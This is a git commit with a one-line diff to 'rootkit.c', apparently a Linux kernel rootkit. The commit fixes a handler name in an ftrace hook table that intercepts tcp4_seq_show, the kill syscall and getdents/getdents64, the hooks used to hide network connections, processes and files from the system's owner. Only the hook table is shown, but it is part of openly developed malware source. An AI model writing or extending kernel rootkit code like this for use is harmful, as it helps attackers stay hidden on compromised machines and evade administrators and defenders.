bf88378136f3ef2434856fe291aa60ad3eca09f1
fluffydolphin <baxterhoey@gmail.com>
2023-03-08 20:54:07 +1300

    fix

--- rootkit.c
+++ rootkit.c
@@ -434,7 +434,7 @@ void hideme(void)
 static struct ftrace_hook hooks[] = {
 #ifdef PTREGS_SYSCALL_STUBS
     HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
-    HOOK("__x64_sys_kill", hook_killz, &orig_kill),
+    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
     HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
     HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
 #else 
